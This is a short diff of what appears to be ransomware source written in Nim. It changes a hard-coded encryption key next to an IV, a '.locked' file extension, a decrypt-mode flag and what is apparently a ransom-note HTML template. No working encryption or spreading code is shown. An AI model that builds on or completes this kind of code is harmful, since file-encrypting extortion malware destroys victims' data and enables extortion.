@@ -110,7 +110,7 @@ proc main() =
   else:
     const decryptMode = false
   
-  const key = "0123456789abcdef0123456789abcdef"
+  const key = "hellow3n2wnj2nwww21"
   const iv = "abcdef9876543210"
   const extension = ".locked"
   var htmlContent = defaultHtml
